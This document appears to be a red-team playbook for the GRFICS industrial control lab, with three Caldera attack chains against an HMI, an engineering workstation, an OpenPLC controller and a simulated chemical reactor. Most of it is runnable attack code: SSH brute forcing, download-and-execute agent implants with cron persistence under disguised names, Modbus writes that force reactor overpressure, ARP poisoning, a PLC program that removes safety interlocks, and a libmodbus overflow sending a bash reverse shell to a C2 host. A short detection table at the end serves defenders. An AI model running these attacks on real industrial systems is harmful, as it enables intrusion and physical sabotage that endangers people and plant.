# GRFICS ICS/OT Red Team Attack Chain Design
## Caldera for OT — Adversary Emulation Playbook

---

## 0. Environment Topology Analysis

Before designing chains, we will map the docker-compose.yml into a threat model.

### Asset Classification

| Container | Role | Network(s) | IP(s) | Key Ports | ICS Asset? |
|-----------|------|-----------|-------|-----------|------------|
| `simulation` | Physical process sim + I/O modules | admin, b-ics-net | 192.168.95.10 | 80 (vis), 55555 (JSON API) | ✅ YES |
| `plc` | OpenPLC (vulnerable libmodbus) | admin, b-ics-net | 192.168.95.2 | 8080 (OpenPLC UI), 502 (Modbus) | ✅ YES |
| `ews` | Engineering Workstation | admin, b-ics-net | 192.168.95.5 | 6080 (VNC) | ✅ YES |
| `hmi` | ScadaLTS / Tomcat SCADA HMI | admin, c-dmz-net | 192.168.90.107 | 6081→8080 | ✅ YES |
| `router` | Firewall + Suricata IDS | admin, b-ics-net, c-dmz-net | .95.200 / .90.200 | — | ⚠️ BOUNDARY |
| `kali` | Attacker workstation | admin, c-dmz-net | 192.168.90.6 | 6088 | ❌ ATTACKER |
| `caldera` | C2 / Caldera for OT server | admin, c-dmz-net | 192.168.90.250 | 8888 | ❌ ATTACKER |
| `elasticsearch` | Log sink | admin | — | 9200 | ❌ INFRA |
| `logstash` | Log pipeline | admin | — | 5044, 5000 | ❌ INFRA |
| `kibana` | SOC dashboard | admin | — | 5601 | ❌ INFRA |

### Network Segments and Pivot Points

```
[ATTACKER SIDE — c-dmz-net 192.168.90.0/24]
  kali         (.6)
  caldera      (.250)   ← C2 server
  hmi          (.107)   ← First ICS pivot point (DMZ-exposed)
  router       (.200)

          ▼ pivot through router ▼

[ICS SIDE — b-ics-net 192.168.95.0/24]
  router       (.200)   ← Network boundary (Suricata here)
  ews          (.5)     ← Engineering workstation
  plc          (.2)     ← OpenPLC + vulnerable Modbus
  simulation   (.10)    ← Physical process (TCP 55555)
```

**Critical insight:** The `hmi` is the only ICS component reachable from the DMZ without crossing the router boundary. It becomes the mandatory pivot point for all chains targeting the ICS-net.

---

## 1. Global Assumptions

| # | Assumption | Rationale |
|---|-----------|-----------|
| A1 | Attacker starts with access to `kali` container | Kali is the designated attacker node per docker-compose |
| A2 | Caldera C2 server is running at 192.168.90.250:8888 | Declared in docker-compose |
| A3 | HMI SSH has a weak/default password (e.g., `admin`/`admin`, `root`/`root`) | GRFICS paper explicitly states weak SSH passwords are intentional |
| A4 | OpenPLC web interface has default credentials (`openplc`/`openplc`) | OpenPLC ships with documented default credentials |
| A5 | Modbus (TCP/502) on PLC and simulation is entirely unauthenticated | Stated explicitly in the paper; Modbus by design |
| A6 | The `libmodbus` library on the PLC is the older vulnerable version | Paper states this was intentionally reverted for exercises |
| A7 | Router permits Modbus (TCP/502) traffic between DMZ and ICS-net after HMI compromise | HMI is in the ICS domain functionally; realistic pivot |
| A8 | Caldera agents can reach back to 192.168.90.250:8888 from any compromised host | All containers share the `a-grfics-admin` bridge network |
| A9 | ScadaLTS HMI connects to PLC via Modbus over the ICS-net | Standard GRFICS architecture per the paper |
| A10 | No MFA or strong authentication anywhere in the ICS-net | Stated as intentional by design in the paper |

---

## 2. Attack Chain Designs

---

### Chain 1 — "Slow Burn": HMI Compromise → Reconnaissance → Modbus False Data Injection → Reactor Overpressure

**Objective:** Blind the operator HMI while injecting false Modbus commands to drive reactor pressure above 3200 kPa, triggering a simulated explosion in the Unity visualization.

**Attacker Profile:** Nation-state / ICS-aware threat actor (Dragos-style Stage 2 ICS Kill Chain)

#### Stage-by-Stage Breakdown

```
[Stage 1] Initial Access
    kali (90.6) → SSH brute-force → hmi (90.107)
    
[Stage 2] Execution + Persistence  
    hmi → deploy Caldera agent → beacon to caldera (90.250)
    
[Stage 3] Discovery
    hmi → nmap scan of 192.168.95.0/24
    hmi → Modbus enumeration of plc (95.2) and simulation (95.10)
    
[Stage 4] Collection
    hmi → read Modbus registers (process state baseline)
    
[Stage 5] Lateral Movement
    hmi → SSH to ews (95.5) [credential reuse or password spray]
    
[Stage 6] Impact — False Data Injection (blind HMI)
    ews → ARP poison HMI↔PLC path
    ews → MITM: intercept Modbus read responses, replay falsified safe readings to HMI
    
[Stage 7] Impact — Command Injection  
    ews → Modbus write: force purge valve CLOSED, product valve OPEN
    simulation (95.10) → reactor pressure climbs → explosion event
```

#### MITRE ATT&CK for ICS Technique Mapping

| Step | Technique Name | Technique ID | Target | Expected Effect |
|------|---------------|--------------|--------|-----------------|
| 1 | Brute Force I/O | T0809 | `hmi` SSH | Shell access as root/admin on HMI container |
| 2 | Remote System Services: SSH | T0866 | `hmi` | Caldera agent installed, persistent C2 beaconing to 90.250 |
| 3 | Network Connection Enumeration | T0840 | 95.0/24 subnet | Discovery of plc (95.2), ews (95.5), simulation (95.10) |
| 3b | Remote System Discovery | T0846 | b-ics-net | Asset inventory: identify PLC model, Modbus device IDs |
| 4 | Point & Tag Identification | T0861 | `plc` TCP/502 | Map Modbus register addresses to valve positions, pressure readings |
| 5 | Lateral Tool Transfer | T0867 | `ews` | Caldera agent binary dropped via SCP/curl from `hmi` |
| 6 | Man in the Middle | T0830 | `plc`↔`hmi` Modbus | Operator sees falsified safe values; actual process diverges |
| 6b | Spoof Reporting Message | T0856 | HMI Modbus feed | ScadaLTS displays normal pressure while reactor climbs |
| 7 | Modify Parameter | T0836 | `simulation` via `plc` | Valve positions altered; pressure accumulates |
| 7b | Loss of View | T0829 | `hmi` | Operator cannot detect process deviation |
| 7c | Loss of Control | T0827 | `plc`/`simulation` | PLC control loop cannot correct; reactor exceeds 3200 kPa |

---

### Chain 2 — "PLC Reprogramming": EWS Compromise → Malicious Ladder Logic Upload → Sustained Process Sabotage

**Objective:** Compromise the Engineering Workstation, then upload a modified PLC program via the OpenPLC web interface that removes safety interlock logic, causing sustained and repeatable process damage.

**Attacker Profile:** Stuxnet-style targeted ICS sabotage (Stage 2 ICS Kill Chain, physical exploit development)

#### Stage-by-Stage Breakdown

```
[Stage 1] Initial Access
    kali (90.6) → exploit ScadaLTS/Tomcat web vulnerability OR SSH brute force → hmi (90.107)
    
[Stage 2] Discovery
    hmi → scan ICS-net → discover ews (95.5) with VNC/SSH open
    
[Stage 3] Lateral Movement
    hmi → SSH password spray to ews (95.5) [credential reuse: admin/admin]
    ews → Caldera agent deployed
    
[Stage 4] Collection — PLC Program Exfiltration
    ews → HTTP GET http://95.2:8080 → download existing PLC program (.st file)
    ews → exfiltrate to caldera for offline analysis
    
[Stage 5] Impact — Malicious Program Upload
    ews → HTTP POST to OpenPLC web interface (95.2:8080)
    → upload modified .st program with:
       (a) pressure safety interlock REMOVED
       (b) purge valve forced CLOSED permanently
       (c) normal HMI polling responses preserved (stealth)
    
[Stage 6] Impact — Sustained Sabotage
    plc → executes malicious ladder logic
    simulation → reactor pressure climbs unchecked
    hmi → shows "normal" (plc still responding to reads normally)
    → explosion event triggers; operator cannot stop it via HMI Stop button
```

#### MITRE ATT&CK for ICS Technique Mapping

| Step | Technique Name | Technique ID | Target | Expected Effect |
|------|---------------|--------------|--------|-----------------|
| 1 | Exploit Public-Facing Application | T0819 | `hmi` Tomcat/ScadaLTS | Web shell or authenticated session on HMI |
| 2 | Remote System Discovery | T0846 | b-ics-net from `hmi` | Discover `ews` at 95.5 with SSH/VNC |
| 3 | Valid Accounts | T0859 | `ews` SSH | Login with reused credentials from HMI |
| 3b | Remote Services | T0886 | `ews` | Shell access, Caldera agent deployed |
| 4 | Program Upload | T0845 | `plc` HTTP/8080 | PLC .st source file retrieved from OpenPLC UI |
| 4b | Data from Local System | T0893 | `ews` filesystem | Process diagrams and PLC config files discovered |
| 5 | Modify Program | T0889 | `plc` OpenPLC web | Malicious ST program replaces legitimate one |
| 5b | Program Download | T0843 | `plc` HTTP/8080 | Malicious program pushed and activated on OpenPLC |
| 6 | Loss of Safety | T0837 | `simulation` | Safety interlock on pressure removed at PLC level |
| 6b | Manipulation of Control | T0831 | `plc`/`simulation` | Sustained valve manipulation; process cannot self-correct |
| 6c | Damage to Property | T0879 | `simulation` | Reactor overpressure → explosion event (permanent until restart) |

---

### Chain 3 — "Zero-Day Style": Modbus Buffer Overflow → PLC RCE → Caldera Implant → Full Process Control

**Objective:** Exploit the intentionally vulnerable `libmodbus` buffer overflow on the PLC to achieve remote code execution, install a persistent Caldera agent, then use it as an ICS-native C2 implant to issue arbitrary process commands.

**Attacker Profile:** Sophisticated threat actor exploiting known-but-unpatched ICS protocol vulnerability (mirrors real-world Triton/TRISIS style capability development)

#### Stage-by-Stage Breakdown

```
[Stage 1] Initial Access
    kali (90.6) → SSH brute force → hmi (90.107)
    hmi → Caldera agent → beacon to caldera (90.250:8888)
    
[Stage 2] Discovery + Vulnerability Validation
    hmi → Modbus scanner → plc (95.2:502)
    → confirm FC 0x17 (Write/Read Registers) is available
    → fingerprint libmodbus version (banner/behavior analysis)
    
[Stage 3] Exploitation — libmodbus Buffer Overflow
    hmi → craft Modbus FC 0x17 frame:
       - Write arbitrary data to control return address region
       - Read request > 260 bytes → overflow rsp[MAX_MESSAGE_LENGTH]
       - Payload: shellcode or ret2libc to /bin/sh or reverse shell
    → trigger on plc (95.2:502)
    → RCE achieved as the OpenPLC process user
    
[Stage 4] Execution + Persistence on PLC
    plc → download Caldera agent binary (curl from 90.250 or kali)
    plc → Caldera agent beacons to caldera (90.250:8888)
    plc → add agent to cron or /etc/rc.local for persistence
    
[Stage 5] Collection from PLC
    plc agent → read /var/log/plc/* (application logs)
    plc agent → read PLC program currently loaded
    plc agent → enumerate Modbus register map from process
    
[Stage 6] Impact — Direct Process Manipulation via Native PLC Access
    plc agent → issue Modbus write directly to simulation (95.10:55555 JSON API via local Modbus)
    → no need to go through HMI; commands issued from inside the PLC process
    → valve positions set to: purgevalvesp=0, productvalvesp=100
    → simulation → pressure exceeds 3200 kPa
    → repeat after each operator reset (persistence guarantees re-exploitation)
```

#### MITRE ATT&CK for ICS Technique Mapping

| Step | Technique Name | Technique ID | Target | Expected Effect |
|------|---------------|--------------|--------|-----------------|
| 1 | Brute Force I/O | T0809 | `hmi` SSH | Initial foothold on HMI |
| 2 | Network Connection Enumeration | T0840 | `plc` TCP/502 | Modbus service confirmed; FC 0x17 available |
| 2b | Point & Tag Identification | T0861 | `plc` Modbus | Register map, function code support fingerprinted |
| 3 | Exploitation of Remote Services | T0866 | `plc` libmodbus | Buffer overflow via FC_WRITE_AND_READ_REGISTERS >260 bytes → RCE |
| 4 | System Firmware / Implant | T0857 | `plc` OS | Caldera agent installed in OpenPLC process context |
| 4b | Hooking | T0874 | `plc` process | Persistence via cron/rc.local; survives service restarts |
| 5 | Data from Local System | T0893 | `plc` | PLC logs and program exfiltrated |
| 5b | Automated Collection | T0802 | `plc`/`simulation` | Modbus register values polled continuously |
| 6 | Modify Parameter | T0836 | `simulation` via `plc` | Valve setpoints forced to unsafe values |
| 6b | Manipulation of Control | T0831 | `plc`/`simulation` | PLC control loop subverted from within |
| 6c | Loss of Safety | T0837 | `simulation` | Pressure safety limit bypass; explosion event |
| 6d | Denial of Control | T0813 | `hmi`→`plc` | Operator Stop commands ignored; PLC controlled by attacker |

---

## 3. Caldera for OT — Step-by-Step Implementation

### 3.0 Caldera Setup and Agent Architecture

```
caldera (90.250:8888)
    │
    ├─ Agent on hmi (90.107)      ← Deployed after SSH brute force
    ├─ Agent on ews (95.5)        ← Deployed after lateral movement
    └─ Agent on plc (95.2)        ← Deployed after buffer overflow (Chain 3)
```

**Agent deployment methods per host:**

```bash
# On hmi (90.107) — initial agent deployment from kali
# After SSH brute force succeeds:
ssh admin@192.168.90.107

# Pull and execute Caldera agent (sandcat)
curl -s -X POST \
  -H "file:sandcat.go-linux" \
  -H "platform:linux" \
  http://192.168.90.250:8888/file/download > /tmp/.svc && \
  chmod +x /tmp/.svc && \
  /tmp/.svc -server http://192.168.90.250:8888 \
            -group hmi \
            -v &
```

```bash
# On ews (95.5) — after lateral movement from hmi
# Agent drops via SCP from hmi:
scp /tmp/.svc admin@192.168.95.5:/tmp/.svc
ssh admin@192.168.95.5 \
  "/tmp/.svc -server http://192.168.90.250:8888 -group ews -v &"
```

```bash
# On plc (95.2) — after buffer overflow exploitation (Chain 3)
# Reverse shell payload → then pull agent:
curl http://192.168.90.250:8888/file/download \
  -H "file:sandcat.go-linux" \
  -H "platform:linux" \
  -o /tmp/.plcsvc && \
  chmod +x /tmp/.plcsvc && \
  /tmp/.plcsvc -server http://192.168.90.250:8888 -group plc -v &
```

---

### 3.1 Full Worked Example — Chain 1 in Caldera

#### Step 1: Create Adversary Profile

Navigate to **Caldera UI → Adversary → New Adversary**

```yaml
# adversary_chain1_modbus_injection.yml
id: chain1-grfics-modbus-injection
name: "GRFICS - Modbus False Data Injection"
description: >
  Simulates an ICS-aware attacker who compromises the HMI via weak SSH,
  performs ICS-net reconnaissance, and injects false Modbus commands to
  cause reactor overpressure while blinding the operator HMI.
atomic_ordering:
  - ability_id: ssh-brute-hmi         # Stage 1
  - ability_id: deploy-agent-hmi      # Stage 2
  - ability_id: nmap-ics-net          # Stage 3
  - ability_id: modbus-enum-plc       # Stage 3b
  - ability_id: modbus-read-baseline  # Stage 4
  - ability_id: ssh-lateral-ews       # Stage 5
  - ability_id: deploy-agent-ews      # Stage 5b
  - ability_id: arp-poison-hmi-plc    # Stage 6
  - ability_id: modbus-inject-valves  # Stage 7
```

#### Step 2: Define Custom Abilities

**Ability 1 — SSH Brute Force on HMI**

```yaml
# ability: ssh-brute-hmi
id: ssh-brute-hmi
name: "SSH Brute Force against HMI"
tactic: initial-access
technique:
  attack_id: T0809
  name: Brute Force I/O
executors:
  - name: sh
    platform: linux
    command: |
      hydra -L /usr/share/wordlists/users.txt \
            -P /usr/share/wordlists/rockyou.txt \
            ssh://192.168.90.107 \
            -t 4 -o /tmp/hmi_creds.txt
    cleanup: rm -f /tmp/hmi_creds.txt
```

**Ability 2 — Nmap ICS Network Discovery**

```yaml
# ability: nmap-ics-net
id: nmap-ics-net
name: "ICS Network Enumeration"
tactic: discovery
technique:
  attack_id: T0840
  name: Network Connection Enumeration
executors:
  - name: sh
    platform: linux
    command: |
      # Run from hmi (90.107) which can reach ICS-net via router
      nmap -sV -p 22,80,502,8080,55555 \
           --open -oN /tmp/ics_scan.txt \
           192.168.95.0/24
    cleanup: rm -f /tmp/ics_scan.txt
```

**Ability 3 — Modbus Register Enumeration (Point & Tag ID)**

```yaml
# ability: modbus-enum-plc
id: modbus-enum-plc
name: "Modbus Point and Tag Identification"
tactic: collection
technique:
  attack_id: T0861
  name: Point & Tag Identification
executors:
  - name: sh
    platform: linux
    command: |
      # Use modbus-cli or python script to enumerate registers
      python3 - <<'EOF'
      from pymodbus.client import ModbusTcpClient
      import json

      client = ModbusTcpClient('192.168.95.2', port=502)
      client.connect()
      
      results = {}
      # Read holding registers 0-20 (valve positions, pressures)
      for unit_id in [1, 2, 3, 4, 5]:
          try:
              rr = client.read_holding_registers(0, 20, slave=unit_id)
              if not rr.isError():
                  results[f'unit_{unit_id}'] = rr.registers
          except Exception as e:
              results[f'unit_{unit_id}_error'] = str(e)
      
      client.close()
      with open('/tmp/modbus_map.json', 'w') as f:
          json.dump(results, f, indent=2)
      print(json.dumps(results, indent=2))
      EOF
    cleanup: rm -f /tmp/modbus_map.json
```

**Ability 4 — Read Process Baseline (Measurement Collection)**

```yaml
# ability: modbus-read-baseline
id: modbus-read-baseline
name: "Read Modbus Process Baseline"
tactic: collection
technique:
  attack_id: T0861
  name: Point & Tag Identification
executors:
  - name: sh
    platform: linux
    command: |
      python3 - <<'EOF'
      from pymodbus.client import ModbusTcpClient
      import time, json

      # Also query simulation API directly for ground truth
      import socket, json as j2

      # Modbus read from PLC
      client = ModbusTcpClient('192.168.95.2', port=502)
      client.connect()
      baseline = {}
      
      # Based on GRFICS: f1flow=reg0, f2flow=reg1, pressure=reg4,
      # liquidlevel=reg5, f1valvepos=reg6, f2valvepos=reg7
      # purgevalvepos=reg8, productvalvepos=reg9
      rr = client.read_holding_registers(0, 16, slave=1)
      if not rr.isError():
          labels = ['f1flow','f2flow','purgeflow','productflow',
                    'pressure','liquidlevel','Ainpurge','Binpurge',
                    'Cinpurge','cost','f1valvepos','f2valvepos',
                    'purgevalvepos','productvalvepos']
          for i, label in enumerate(labels):
              baseline[label] = rr.registers[i]
      client.close()
      
      # Also query simulation JSON API
      sock = socket.socket()
      sock.connect(('192.168.95.10', 55555))
      sock.send(b'{"request":"read"}')
      data = sock.recv(4096)
      sock.close()
      baseline['simulation_api'] = j2.loads(data)
      
      print(json.dumps(baseline, indent=2))
      with open('/tmp/process_baseline.json', 'w') as f:
          json.dump(baseline, f, indent=2)
      EOF
```

**Ability 5 — Modbus False Data Injection (Impact)**

```yaml
# ability: modbus-inject-valves
id: modbus-inject-valves
name: "Modbus Command Injection - Reactor Overpressure"
tactic: impact
technique:
  attack_id: T0836
  name: Modify Parameter
executors:
  - name: sh
    platform: linux
    command: |
      python3 - <<'EOF'
      from pymodbus.client import ModbusTcpClient
      import time

      TARGET_PLC = '192.168.95.2'
      TARGET_SIM = '192.168.95.10'

      # Attack: close purge valve (register 8 = purgevalvesp → 0)
      # and force product valve open (register 9 = productvalvesp → 100)
      # This causes pressure to build with no relief path
      
      client_plc = ModbusTcpClient(TARGET_PLC, port=502)
      client_sim = ModbusTcpClient(TARGET_SIM, port=502)
      
      client_plc.connect()
      client_sim.connect()
      
      print("[*] Injecting malicious valve setpoints...")
      
      for _ in range(30):  # sustain for 30 iterations
          # Write to PLC: purge valve CLOSED, product valve MAX
          client_plc.write_register(8, 0, slave=1)   # purgevalvesp = 0
          client_plc.write_register(9, 100, slave=1) # productvalvesp = 100
          
          # Also write directly to simulation I/O modules
          client_sim.write_register(2, 0, slave=3)   # sim purgevalvepos = 0
          client_sim.write_register(3, 100, slave=4) # sim productvalvepos = 100
          
          # Read pressure to monitor progress toward 3200 kPa
          rr = client_plc.read_holding_registers(4, 1, slave=1)
          if not rr.isError():
              pressure = rr.registers[0]
              print(f"[*] Current pressure: {pressure} kPa (limit: 3200)")
              if pressure >= 3000:
                  print("[!] CRITICAL: Approaching safety limit!")
          time.sleep(2)
      
      client_plc.close()
      client_sim.close()
      print("[*] Injection complete. Monitor simulation for explosion event.")
      EOF
```

**Ability 6 — ARP Poisoning for HMI Blinding (MITM)**

```yaml
# ability: arp-poison-hmi-plc
id: arp-poison-hmi-plc
name: "ARP Poison HMI-PLC Path (Operator Blinding)"
tactic: impact
technique:
  attack_id: T0830
  name: Man in the Middle
executors:
  - name: sh
    platform: linux
    command: |
      # Run from ews (95.5) which shares b-ics-net with hmi and plc
      # Enable IP forwarding
      echo 1 > /proc/sys/net/ipv4/ip_forward
      
      # ARP poison: tell HMI that PLC's IP has our MAC
      #             tell PLC that HMI's IP has our MAC
      arpspoof -i eth1 -t 192.168.95.2 192.168.90.107 &
      arpspoof -i eth1 -t 192.168.90.107 192.168.95.2 &
      
      # Use mitmproxy or custom script to intercept and replay
      # safe pressure readings to HMI while real process diverges
      python3 - <<'MITM'
      import subprocess, threading, time
      
      # Capture Modbus traffic with tcpdump for analysis
      proc = subprocess.Popen([
          'tcpdump', '-i', 'eth1', '-w', '/tmp/modbus_capture.pcap',
          'tcp port 502'
      ])
      
      print("[*] MITM active. Modbus traffic being intercepted.")
      print("[*] HMI will see falsified safe readings.")
      time.sleep(120)  # Hold MITM for 2 minutes
      
      proc.terminate()
      MITM
    cleanup: |
      killall arpspoof 2>/dev/null
      echo 0 > /proc/sys/net/ipv4/ip_forward
      rm -f /tmp/modbus_capture.pcap
```

#### Step 3: Create Operation in Caldera

Navigate to **Caldera UI → Operations → New Operation**

```json
{
  "name": "GRFICS Chain 1 - Modbus Injection",
  "adversary": {
    "adversary_id": "chain1-grfics-modbus-injection"
  },
  "planner": "sequential",
  "group": "hmi",
  "jitter": "2/8",
  "auto_close": false,
  "state": "running",
  "obfuscator": "plain-text",
  "visibility": 51,
  "facts": [
    {"trait": "target.plc.ip", "value": "192.168.95.2"},
    {"trait": "target.sim.ip", "value": "192.168.95.10"},
    {"trait": "target.ews.ip", "value": "192.168.95.5"},
    {"trait": "target.hmi.ip", "value": "192.168.90.107"},
    {"trait": "caldera.server", "value": "192.168.90.250:8888"},
    {"trait": "modbus.pressure.limit", "value": "3200"},
    {"trait": "credentials.hmi.user", "value": "admin"},
    {"trait": "credentials.hmi.pass", "value": "admin"}
  ]
}
```

#### Step 4: Agent Group Targeting per Stage

| Stage | Ability | Agent Group | Container |
|-------|---------|-------------|-----------|
| 1 | ssh-brute-hmi | `kali` | kali (90.6) |
| 2 | deploy-agent-hmi | `kali` | kali → hmi |
| 3 | nmap-ics-net | `hmi` | hmi (90.107) |
| 3b | modbus-enum-plc | `hmi` | hmi (90.107) |
| 4 | modbus-read-baseline | `hmi` | hmi (90.107) |
| 5 | ssh-lateral-ews | `hmi` | hmi → ews |
| 5b | deploy-agent-ews | `hmi` | hmi → ews (95.5) |
| 6 | arp-poison-hmi-plc | `ews` | ews (95.5) |
| 7 | modbus-inject-valves | `ews` | ews (95.5) |

---

### 3.2 Chain 2 — PLC Reprogramming: Key Caldera Abilities

**Ability: Download Existing PLC Program**

```yaml
# ability: plc-program-download
id: plc-program-upload
name: "PLC Program Exfiltration via OpenPLC Web Interface"
tactic: collection
technique:
  attack_id: T0845
  name: Program Upload
executors:
  - name: sh
    platform: linux
    command: |
      # OpenPLC default credentials: openplc/openplc
      # Authenticate and download current program
      
      # Get session cookie
      curl -c /tmp/openplc_cookies.txt \
           -d "username=openplc&password=openplc" \
           http://192.168.95.2:8080/dashboard \
           -L -o /dev/null -s
      
      # Download current PLC program
      curl -b /tmp/openplc_cookies.txt \
           http://192.168.95.2:8080/upload-program \
           -o /tmp/original_plc_program.st
      
      echo "[*] PLC program downloaded:"
      head -50 /tmp/original_plc_program.st
    cleanup: rm -f /tmp/openplc_cookies.txt /tmp/original_plc_program.st
```

**Ability: Modify and Upload Malicious PLC Program**

```yaml
# ability: plc-program-modify-upload
id: plc-program-modify-upload
name: "Malicious PLC Program Upload - Remove Safety Interlocks"
tactic: impact
technique:
  attack_id: T0889
  name: Modify Program
executors:
  - name: sh
    platform: linux
    command: |
      python3 - <<'EOF'
      import requests, re, time

      BASE = "http://192.168.95.2:8080"
      CREDS = {"username": "openplc", "password": "openplc"}
      
      s = requests.Session()
      
      # Authenticate
      r = s.post(f"{BASE}/dashboard", data=CREDS, allow_redirects=True)
      print(f"[*] Auth status: {r.status_code}")
      
      # Malicious ST program: removes pressure interlock, forces purge valve closed
      # Based on GRFICS multi-loop PID control structure
      malicious_program = """
      PROGRAM pressure_control
        VAR
          pressure_local : REAL;
          pressure_input : UINT;
        END_VAR
        
        (* SABOTAGE: Read pressure but do NOT act on high pressure *)
        pressure_input := GetAnalogInput(1);
        pressure_local := INT_TO_REAL(pressure_input) * 0.1;
        
        (* REMOVED: Original safety interlock that would open purge valve *)
        (* if pressure_local > 2800.0 then SetAnalogOutput(3, 100); end_if; *)
        
        (* SABOTAGE: Force purge valve permanently CLOSED *)
        SetAnalogOutput(3, 0);     (* purge valve = 0% *)
        SetAnalogOutput(1, 0);     (* f1 valve = 0% *)
        
        (* Keep polling HMI to avoid detection by "still responding" check *)
        SetAnalogOutput(4, 50);    (* product valve = nominal looking value *)
        
      END_PROGRAM
      """
      
      # Upload malicious program
      files = {'file': ('malicious_pressure_control.st', 
                        malicious_program, 
                        'text/plain')}
      
      r = s.post(f"{BASE}/upload-program", files=files)
      print(f"[*] Upload status: {r.status_code}")
      
      # Wait for compile + start
      time.sleep(5)
      
      # Trigger program start
      r = s.get(f"{BASE}/start_plc")
      print(f"[*] PLC start triggered: {r.status_code}")
      print("[!] Malicious program now running. Safety interlocks REMOVED.")
      print("[!] Purge valve forced CLOSED. Reactor pressure will climb.")
      EOF
```

---

### 3.3 Chain 3 — Buffer Overflow: Key Caldera Abilities

**Ability: libmodbus Buffer Overflow Exploit**

```yaml
# ability: modbus-bof-exploit
id: modbus-bof-exploit
name: "libmodbus FC0x17 Buffer Overflow RCE on PLC"
tactic: execution
technique:
  attack_id: T0866
  name: Exploitation of Remote Services
executors:
  - name: sh
    platform: linux
    command: |
      python3 - <<'EOF'
      import socket, struct, time

      PLC_IP   = "192.168.95.2"
      PLC_PORT = 502
      C2_IP    = "192.168.90.250"
      C2_PORT  = 4444   # Caldera reverse shell listener

      def build_modbus_fc17_overflow(write_addr, read_addr, read_count,
                                      write_data, payload):
          """
          FC 0x17 = Write/Read Multiple Registers
          Structure: TransID(2) ProtoID(2) Len(2) UnitID(1) FC(1)
                     ReadAddr(2) ReadCount(2) WriteAddr(2) WriteCount(2)
                     ByteCount(1) WriteData(n)
          
          Vulnerability: read_count * 2 bytes written to rsp[260]
          If read_count > 130, overflow occurs.
          """
          transaction_id = 0x0001
          protocol_id    = 0x0000
          unit_id        = 0x01
          fc             = 0x17  # FC_WRITE_AND_READ_REGISTERS
          
          # Craft write data (contains return address overwrite payload)
          write_count    = len(write_data) // 2
          byte_count     = len(write_data)
          
          # read_count > 130 triggers overflow (130 * 2 = 260 bytes = MAX)
          overflow_count = 150  # 150 * 2 = 300 bytes → overflow by 40 bytes
          
          pdu = struct.pack('>HHH', read_addr, overflow_count, write_addr)
          pdu += struct.pack('>HB', write_count, byte_count)
          pdu += write_data  # Contains NOP sled + shellcode in register data
          
          length = 1 + 1 + len(pdu)  # unit_id + fc + pdu
          mbap = struct.pack('>HHH', transaction_id, protocol_id, length)
          mbap += struct.pack('>BB', unit_id, fc)
          
          return mbap + pdu

      # Note: In a real exercise, shellcode is pre-compiled for the target arch
      # For GRFICS: Ubuntu 16.04 x86_64, NX disabled on vulnerable build
      # Using ret2libc: system("/bin/bash -i >& /dev/tcp/C2_IP/C2_PORT 0>&1")
      
      # Reverse shell payload (base64 encoded for transport through binary)
      import base64
      cmd = f"bash -i >& /dev/tcp/{C2_IP}/{C2_PORT} 0>&1"
      shell_cmd = base64.b64encode(cmd.encode()).decode()
      
      # Simplified exploit frame for demonstration
      # Real exploit requires correct offset calculation (ROP chain for NX)
      write_data = b'\x41' * 100  # Filler representing crafted payload
      write_data += struct.pack('<Q', 0xdeadbeefcafebabe)  # ret addr overwrite
      
      frame = build_modbus_fc17_overflow(
          write_addr=0x0000,
          read_addr=0x0000,
          read_count=150,   # Triggers overflow
          write_data=write_data,
          payload=b""
      )
      
      print(f"[*] Connecting to PLC at {PLC_IP}:{PLC_PORT}")
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((PLC_IP, PLC_PORT))
      
      print(f"[*] Sending FC 0x17 overflow frame ({len(frame)} bytes)...")
      sock.send(frame)
      time.sleep(1)
      
      response = sock.recv(1024)
      print(f"[*] Response: {response.hex()}")
      sock.close()
      
      print(f"[!] If exploit succeeded, reverse shell connects to {C2_IP}:{C2_PORT}")
      print("[*] Check Caldera listener for incoming PLC shell session")
      EOF
```

**Ability: Caldera Agent Deployment on PLC (Post-Exploitation)**

```yaml
# ability: plc-agent-implant
id: plc-agent-implant
name: "Deploy Caldera Agent on PLC via Reverse Shell"
tactic: persistence
technique:
  attack_id: T0857
  name: System Firmware
executors:
  - name: sh
    platform: linux
    # Runs from the reverse shell session on PLC (handled via netcat/C2 pipe)
    command: |
      # From PLC reverse shell:
      curl -s http://192.168.90.250:8888/file/download \
           -H "file:sandcat.go-linux" \
           -H "platform:linux" \
           -o /tmp/.openplc_update && \
      chmod +x /tmp/.openplc_update
      
      # Persist via cron (survives container restart if volume-backed)
      (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.openplc_update \
        -server http://192.168.90.250:8888 \
        -group plc -v > /dev/null 2>&1") | crontab -
      
      # Start agent immediately
      /tmp/.openplc_update \
        -server http://192.168.90.250:8888 \
        -group plc \
        -v &
      
      echo "[*] Caldera agent deployed on PLC. Group: plc"
      echo "[*] Persistence: cron every 5 minutes"
```

---

## 4. Expected Telemetry and Detection Opportunities

### Chain 1 Telemetry

| Attack Step | Log Source | Log File (from docker-compose) | Expected Event | DC Reference |
|-------------|-----------|-------------------------------|----------------|--------------|
| SSH brute force → HMI | HMI auth | `./shared_logs/hmi/auth.log` | Multiple `sshd: Failed password` events; eventual `Accepted password` | DC0067, DC0088 |
| Nmap scan from HMI | Router Suricata | `./shared_logs/router/` | `ET SCAN Nmap` alerts; SYN flood to .95.0/24 | DC0078, DC0085 |
| Modbus enumeration | Router Suricata | `./shared_logs/router/` | Modbus read requests to multiple unit IDs; `ET SCADA Modbus Scanner` | DC0082 |
| Modbus baseline read | PLC syslog | `./shared_logs/plc/syslog` | Increased Modbus connection count from non-HMI source (HMI=90.107, scan from 90.107 is suspicious) | DC0109 |
| SSH lateral HMI→EWS | EWS auth | `./shared_logs/ews/auth.log` | `sshd: Accepted password for admin from 192.168.90.107` (HMI→EWS is abnormal) | DC0067, DC0088 |
| ARP poisoning | EWS/PLC kernel | `./shared_logs/ews/kern.log` | `neighbour: arp_cache: neighbor table overflow` or ARP reply storms | DC0016 |
| Modbus valve injection | PLC audit | `./shared_logs/plc/audit` | Auditd syscalls showing write operations on Modbus socket; unusual register write patterns | DC0021, DC0032 |
| Process alarm | Simulation alarms | `./shared_logs/simulation/process_alarms` | Pressure > 2800 kPa alarm; then > 3200 kPa CRITICAL alarm | DC0109 |
| HMI loses real view | HMI Tomcat | `./shared_logs/hmi/catalina` | ScadaLTS may log Modbus read errors or value anomalies if MITM breaks TCP | DC0109 |

### Chain 2 Telemetry

| Attack Step | Log Source | Log File | Expected Event |
|-------------|-----------|----------|----------------|
| EWS SSH brute force | EWS auth | `./shared_logs/ews/auth.log` | Repeated failed SSH from 90.107; eventual success |
